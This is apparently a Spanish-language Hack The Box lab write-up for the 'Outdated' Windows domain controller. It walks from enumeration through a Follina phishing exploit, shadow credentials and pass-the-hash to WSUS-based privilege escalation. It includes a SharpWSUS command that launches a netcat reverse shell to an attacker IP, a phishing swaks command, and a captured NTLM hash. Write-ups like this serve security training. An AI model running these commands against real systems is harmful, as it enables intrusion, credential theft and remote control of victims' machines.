---
layout:   post
title:    "Write Up Outdated."
subtitle: "Starting-Point"
category:   HTB
tags:      [Medium,Windows,SMB,CVE,WinRM,BloodHound,BloodHound,EvilWinRM,SMB,Active-Directory,Write-Up-Machine,OSCP,eWPT,eWPTXv2,OSWE]
---
![list](/assets/img/outdated/Captura%20de%20pantalla%20(188).png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando 

diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.11.175 -oG allports
```

![list](/assets/img/outdated/Kali-2022-09-05-14-10-52.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que versiones y servicios que corren en los mismo de ahi podremos determinara posibles vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -sCV -p25,53,88,135,139,143,389,445,464,587,593,636,2179,3268,3269,5985,8530,8531,9389 10.10.10.248 -oN target
```

![list](/assets/img/outdated/Kali-2022-09-05-14-15-03.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***
## Analisis de vulnerabilidades

Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros.

Pero comovemos el puerto 445 de samba abierto vamos a pasarle el crackmapexec para ver el nombre de la maquina y el dominio.

![list](/assets/img/outdated/A-2022-12-31-01-14-36.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
El doninio es `outdated.htb`,lo agrgamos al `/etc/hosts` y el nombre de la maquina ed DC y el smb no esta firmado.

Por otra parte con smbclient y smbmap vamos a ver que shares podemos enumerar para obtener algun tipo de informacion.

![list](/assets/img/outdated/AWESOMW-2023-01-03-12-41-46.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Dentro de la carpeta compartida share hay PDF llamado `NOC_Reminder.pdf`.

![list](/assets/img/outdated/A-2022-12-31-01-36-16.png){:.lead width="800" height="100" loading="lazy"}

tambien podemos tratar de conectarnos por rpc pero no tenemos suerte, tambien provemos el kerbrute ya que tenemos el puerto 88 abierto el de kerberos y nos aparecen dos usuarios validoa al parecer `Administrator@outdated.htb` y `guest@outdated.htb` que vamos a provar ARSProast attack pero no tenemos suerte.

Haci que como no conseguimos nada por ese camino regresamos al pdf y lo que probamos es a mandar un correo al correo que dice en el pdf por lo que se es un reporte del NOC sobre la ultimas vulnerabilidades acontecidas el correo se lo mandamos e la siguente manera. 

```bash
swaks --to itsupportqoutdated.htb --from axel@outdated --server mail.outdated.htb --body "http://10.10.16.45" --header "Subject: INTERNAL WEB APPLICATION"
```

{:.note}
Nos ponemos ala escucha en el puerto 443 con netcat para ver cuando se conecte la informcion del User-Aagente.

![list](/assets/img/outdated/AWESOMW-2023-01-04-02-43-15.png){:.lead width="800" height="100" loading="lazy"}

Buscando por los exploit representado en el pdf encontramos el [follina] nos lo decargamos , para usar este exploy debemos ejecutar uns instruccion por eso vamos a usar `nishang`  la [powersell.ps1] y/o [ConPtyShell] para ganar acceso al sistema.

[follina]:(https://github.com/chvancooten/follina.py)
[powersell.ps1]:(https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
[ConPtyShell]:(https://github.com/antonioCoco/ConPtyShell)

![list](/assets/img/outdated/AWESOMW-2023-01-04-02-59-47.png){:.lead width="800" height="100" loading="lazy"}


Lo que hace follina es inyectar un paylodad malicio al servido como exploit.html que esta encriptado en base 64 y lo que trata de  ejecutar son es un binario en el servidor `mpsigstub.exe`.

Ahora lo que debemos hacer es volver a mandar el correo con un servidor web levantado en el puero 80 ademas de estar ala escucha por el puerto 443 y ejecutarlo esto lo que hara esque por detars ejecutara la shell de nidshang orotgandono una shell en el servidor.

![list](/assets/img/outdated/AWESOMW-2023-01-04-03-11-05.png){:.lead width="800" height="100" loading="lazy"}

Aunque ya estamos en la ,maquina victima aun no podemos ver la flag del usuario de bajos privileguios ya que estamos en un contenedor, por lo que es hora de pivotiar de usuario y para eso trataremos de de ver los privilegios del mismo, taareas etc.

## Escalacion de Privileguios

Como husmeando por todos los servidores vamo a jugar con bloohound para saber que caminos para hacernos domain controller para esto ejecutamos `neo4j console` esto te abrira un puerto local 4747 y luego debemos hacer el comando `bllohound &> /dev/null disown` para abrirlo y nos vamos a dscargar y subir a la maquina victima la herramienta [sharkhound.ps1] para recolectar informacion.

[sharkhound.ps1]:(https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

![list](/assets/img/outdated/AWESOMW-2023-01-04-12-31-47.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
El `data.zip` que nos da lo subimo al bloodhound para ver la info que nos arrojo.


![list](/assets/img/outdated/Captura%20de%20pantalla%20(293).png){:.lead width="800" height="100" loading="lazy"}

![list](/assets/img/outdated/Captura%20de%20pantalla%20(294).png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Descargamos el [whisker] y lo subimos a la maquina victima y luego lo ejecutamos.

[whisker]:(https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1)

```bash
Invoke-Wisker -Command "add /target:sflowers"
```

![list](/assets/img/outdated/AWESOMW-2023-01-04-14-28-56.png){:.lead width="800" height="100" loading="lazy"}

Ahora nos decargaremos el [Ruberus] de igualmanera lo subiremos a la maquina victima y lo ejecutaremos.

[Ruberus]:(https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

{:.note}
Esto nos dara el hash ntlm `1FCDB1F6015DCB318CC77BB2BDA14DB5` el caul usaremos para hacer pass the hash.

![list](/assets/img/outdated/AWESOMW-2023-01-04-14-33-29.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Con crackmapexec verificamos si el has es valido para smb pero no lo es , tambien lo verificamos para el servicio de winrm y si es valida y podemos hacer pass the hash y conectarnos, ahora somos el usuario `sflowers`.

![list](/assets/img/outdated/AWESOMW-2023-01-04-14-35-47.png){:.lead width="800" height="100" loading="lazy"}

Ya podemos visualizar las flag del usuario e bajos privileguios en el escritorio del usuario `sflowers`.

![list](/assets/img/outdated/AWESOMW-2023-01-04-14-43-52.png){:.lead width="800" height="100" loading="lazy"}

Ahora debemos tratr de obtener privileguios nt authoryty system que es el usuario con privileguios root para esto vamos a enumerar los permioso de `sflowers`.

![list](/assets/img/outdated/AWESOMW-2023-01-04-14-44-34.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Como vemos tenemos permisos [WSUS] haci que averiguaremos sobre el tema y veremos posibles exploits.

[WSUS]:(https://labs.nettitude.com/blog/introducing-sharpwsus/)

Aparte nos debemos decargar el repo para compilarlo en una maquina windows y crear el sharpwsus.exe tambien nos decargaremos el [psexec] y el netcat tambien porque se ve que se usa los dos para explotar la vulnerabilidad y ejecutamos los siguientes comandos.

[psexec]:(https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

```bash
.\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\psexec.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\\Temp\\nc.exe -e 10.10.16.14 443" /tittle:"shell"
```

{:.note}
Como es obio se debe esatar a la escucha con netcat en el puerto 443, pero debemos esperar a que se suba el parche esto puede demorar uno tres a cinco minutos, para comprovarlo podemos usar `check` como se muestra en la siguiente imagen solo debemos cambiar el `computername` y el `groupname` por los que usted puso.

![list](/assets/img/outdated/AWESOMW-2023-01-04-15-36-45.png){:.lead width="800" height="100" loading="lazy"}

![list](/assets/img/outdated/AWESOMW-2023-01-04-15-36-45.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La flag de root.txt esta en el ecritorio del usuario privilegiado.

***
```bash
🎉 Felicitaciones ya has comprometido Outdated de Hack The Box. 🎉
```
{:.centered}
***